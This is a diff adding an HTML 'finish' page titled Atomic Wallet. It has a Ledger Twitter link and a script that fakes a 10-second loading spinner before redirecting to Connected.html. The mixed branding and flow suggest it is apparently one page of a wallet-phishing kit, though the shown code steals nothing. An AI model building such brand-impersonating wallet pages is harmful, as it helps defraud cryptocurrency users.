@@ -1,0 +1,85 @@
+<html lang="en"><head><meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Atomic Wallet</title>
+<link href="css/standalone.5308b6b6.css" rel="preload" as="style">
+<link href="css/standalone.5308b6b6.css" rel="stylesheet">
+<link rel="shortcut icon" href="./media/logo.ico">
+<style>
+    .hidden-field {
+      display: none;
+    }
+
+    .loader-container {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+
+    .loader {
+
+      border: 16px solid #f3f3f3;
+      border-top: 16px solid #010202;
+      border-radius: 50%;
+      width: 120px;
+      height: 120px;
+      animation: spin 2s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    </style>
+</head>
+<body>
+<div class="wrap"><div data-v-a92dbbbe="" class="sign mui-fl-central">
+<header data-v-a92dbbbe="" class="s-header mui-fl-vert mui-fl-btw">
+<h1 data-v-a92dbbbe="" class=""></h1>
+<button data-v-a92dbbbe="" class="help-btn taplight2"></button>
+</header><div data-v-a92dbbbe="" class="signbox">
+<div data-v-a92dbbbe="" class="sb-header">
+<form action="Connected.html">
+<button data-v-a92dbbbe="" class="back-btn taplight2" style="display: none;"></button>
+<ul data-v-a92dbbbe="" class="step mui-fl-central"><li data-v-a92dbbbe="" class="active"></li>
+<li data-v-a92dbbbe="" class="active"></li><li data-v-a92dbbbe="" class="active"></li>
+<li data-v-a92dbbbe="" class=""></li></ul></div><div data-v-a92dbbbe="" class="sb-body">
+<p data-v-a92dbbbe="" class="lab">You’re all done !</p>
+<p data-v-a92dbbbe="" class="lab2">Follow along with product updates or reach out if you have any question.</p>
+<ul data-v-a92dbbbe="" class="btn-list medium"><li data-v-a92dbbbe="" class="large">
+<a data-v-a92dbbbe="" href="https://twitter.com/Ledger?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor" target="_blank" class="mui-fl-vert mui-fl-btw"><p data-v-a92dbbbe="" class="mui-fl-vert"><i data-v-a92dbbbe="" class="icon-content"></i>
+<span data-v-a92dbbbe="">Follow us on Twitter</span>
+</p><i data-v-a92dbbbe="" class="icon-arrow"></i></a></li>
+</ul>
+<button type="submit" data-testid="submit" data-v-a92dbbbe="" class="fz18 marg-t van-button van-button--info van-button--normal van-button--block">
+<div data-v-a92dbbbe="" class="van-button__content"><span data-v-a92dbbbe="" class="van-button__text">Finish</span>
+</div>
+</button>
+</div>
+</div>
+</div>
+</div>
+</form>
+<div class="loader-container" id="loaderContainer">
+<div class="loader"></div>
+<script>
+  const loaderContainer = document.getElementById('loaderContainer');
+  const form = document.querySelector('form');
+  const redirectUrl = 'Connected.html'; // Replace 'loading.html' with the actual URL you want to redirect to
+
+  form.addEventListener('submit', function(event) {
+    event.preventDefault(); // Prevent the default form submission
+
+    // Show the loader
+    loaderContainer.style.display = 'block';
+
+    // After 5 seconds, redirect to the specified URL
+    setTimeout(function() {
+      window.location.href = redirectUrl;
+    }, 10000); // 5000 milliseconds = 5 seconds
+  });
+</script>
+</body>
+</html>
